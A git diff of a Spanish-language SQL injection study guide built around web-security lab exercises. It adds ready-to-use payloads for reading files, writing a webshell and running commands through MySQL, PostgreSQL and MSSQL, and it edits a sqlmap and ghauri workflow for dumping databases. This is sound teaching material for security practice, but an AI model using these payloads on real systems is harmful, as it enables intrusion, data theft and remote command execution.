@@ -453,7 +453,6 @@ Para ver cómo funciona esto, supongamos que se envían `dos solicitudes` que co
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 ```
 
-
 ```
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 ```
@@ -732,6 +731,16 @@ En este `laboratorio` podemos ver un `ejemplo` de `esto`:
 
 - SQL injection attack, listing the database contents on Oracle - [https://justice-reaper.github.io/posts/SQLI-Lab-6/](https://justice-reaper.github.io/posts/SQLI-Lab-6/)
 
+## Leer y escribir ficheros mediante SQL injection
+
+En `algunos casos` podemos `escalar` una `SQL injection` para `leer` o `escribir ficheros` en el `servidor`, e incluso `ejecutar comandos`, lo que nos permitiría `leer archivos como /home/carlos/secret`. Esto depende del `sistema gestor de base de datos (SGBD)` y de los `privilegios` del usuario de la base de datos:
+
+- `MySQL`: para `leer` un fichero usamos `LOAD_FILE('/home/carlos/secret')` (requiere el privilegio `FILE` y que `secure_file_priv` lo permita). Podemos `combinarlo con UNION` para ver el contenido en la respuesta, por ejemplo `' UNION SELECT LOAD_FILE('/home/carlos/secret')-- -`. Para `escribir` un fichero (por ejemplo una webshell) usamos `... INTO OUTFILE '/var/www/html/shell.php'`
+
+- `PostgreSQL`: para `leer` un fichero usamos `pg_read_file('/home/carlos/secret')` o `COPY nombreTabla FROM '/home/carlos/secret'`. Para `ejecutar comandos (RCE)` usamos `COPY nombreTabla FROM PROGRAM 'comando'`
+
+- `Microsoft SQL Server (MSSQL)`: podemos `ejecutar comandos` habilitando y usando `xp_cmdshell` mediante `stacked queries`, por ejemplo `'; EXEC xp_cmdshell 'type C:\ruta\fichero'-- -`
+
 ## Cheatsheet
 
 Debido a que hay diferentes bases de datos y cada una tiene sus particularidades es recomendable que revisemos la `cheatsheet de portswigger` sobre SQL injection [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) para saber como se consulta el `tipo`, la `versión` y como se enumera `contenido` de cada una de las bases de datos
@@ -760,13 +769,11 @@ Debido a que hay diferentes bases de datos y cada una tiene sus particularidades
 
 ## Cheatsheet
 
-Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:
+Usaremos esta `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:
 
 - Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)
 
 ## ¿Cómo detectar y explotar una SQL injection?
-
-Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:
 
 1 - `Instalar` las extensiones `Hackvertor`, `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `SQLmap DNS Collaborator` y `Backslash Powered Scanner` de `Burpsuite`
 
@@ -778,23 +785,23 @@ Teniendo en cuenta que `los términos y herramientas mencionados a continuación
 
 5 - Si hay un `panel de login` podemos intentar `hacer` un `login bypass` con la típica inyección `' or 1=1-- - ` antes de lanzar `sqlmap`, `ghauri` o `escanear los insertion points`
 
-5 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`. `Antes de lanzar sqlmap nos vamos a Burpsuite y cargamos la extensión SQLMap DNS Collaborator y nos copiamos el ese parámetro para usarlo en sqlmap`. Lo `primero` que vamos a `hacer` es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C columna1,columna2 --dump`
+6 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`. `Antes de lanzar sqlmap nos vamos a Burpsuite y cargamos la extensión SQLMap DNS Collaborator y nos copiamos el ese parámetro para usarlo en sqlmap`. Lo `primero` que vamos a `hacer` es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C columna1,columna2 --dump`
 
 ```
 sudo sqlmap -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --risk=3 --level=5 --dns-domain=9180tced6onerv845e8zg0m8pzvpje.oastify.com --random-agent --batch --insertarParámetrosMencionadosArriba
 ```
 
-6 - Mientras `sqlmap` está `corriendo`, `analizamos la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`. Lo `primero` que vamos a hacer es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C  columna1,columna2 --dump`
+7 - Mientras `sqlmap` está `corriendo`, `analizamos la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`. Lo `primero` que vamos a hacer es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C  columna1,columna2 --dump`
 
 ```
 ghauri -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --level=3 --random-agent --batch --insertarParámetrosMencionadosArriba
 ```
 
-7 - `Si tenemos algún problema con las queries de ghauri o de sqlmap podemos usar el parámetro --flush-session para borrar todo lo descubierto y empezar de nuevo` o `el parámetro --fresh-queries que hace que sqlmap y ghauri recuerden el punto de inyección pero realizan las queries para listar bases de datos, tablas, columnas etc nuevamente`. Es decir, `si hay problemas a la hora de etectar el punto de inyección, usamos --flush-session` y `si hay problema a la hora de extraer datos usamos --fresh-queries`
+8 - `Si tenemos algún problema con las queries de ghauri o de sqlmap podemos usar el parámetro --flush-session para borrar todo lo descubierto y empezar de nuevo` o `el parámetro --fresh-queries que hace que sqlmap y ghauri recuerden el punto de inyección pero realizan las queries para listar bases de datos, tablas, columnas etc nuevamente`. Es decir, `si hay problemas a la hora de etectar el punto de inyección, usamos --flush-session` y `si hay problema a la hora de extraer datos usamos --fresh-queries`
 
-8 - `Si vemos que sqlmap o ghauri no pueden ejecutar la consulta bien pero ya hemos detectado la SQLI mediante sqlmap, ghauri o analizando los insertion points`, vamos a `llevar a cabo la explotación manualmente`. Para ayudarnos podemos usar la `cheatsheet` de `SQLI` de `Portswigger` [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y `los posts mencionados en esta sección de la guía` [https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections](https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections). `Si la SQLI que estamos explotando no se da tal cual se muestra en los posts podemos pasarle la cheathseet de SQLI de Portswigger a la IA para que nos ayude a elaborar un payload válido`
+9 - `Si vemos que sqlmap o ghauri no pueden ejecutar la consulta bien pero ya hemos detectado la SQLI mediante sqlmap, ghauri o analizando los insertion points`, vamos a `llevar a cabo la explotación manualmente`. Para ayudarnos podemos usar la `cheatsheet` de `SQLI` de `Portswigger` [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y `los posts mencionados en esta sección de la guía` [https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections](https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections). `Si la SQLI que estamos explotando no se da tal cual se muestra en los posts podemos pasarle la cheathseet de SQLI de Portswigger a la IA para que nos ayude a elaborar un payload válido`
 
-9 - `Puede darse el caso en que los datos por POST se transmitan en formato XML`, en estos casos `vamos a hacer la explotación de forma manual`. `Lo más seguro es que no detectemos la SQLI con los escáneres`, así que `vamos a seguir los pasos de este laboratorio` [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/) y `a utilizar la IA para adaptar los paylods si se está usando una base de datos diferente a la del ejemplo`
+10 - `Puede darse el caso en que los datos por POST se transmitan en formato XML`, en estos casos `vamos a hacer la explotación de forma manual`. `Lo más seguro es que no detectemos la SQLI con los escáneres`, así que `vamos a seguir los pasos de este laboratorio` [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/) y `a utilizar la IA para adaptar los paylods si se está usando una base de datos diferente a la del ejemplo`
 
 ## Prevenir SQL injections
 
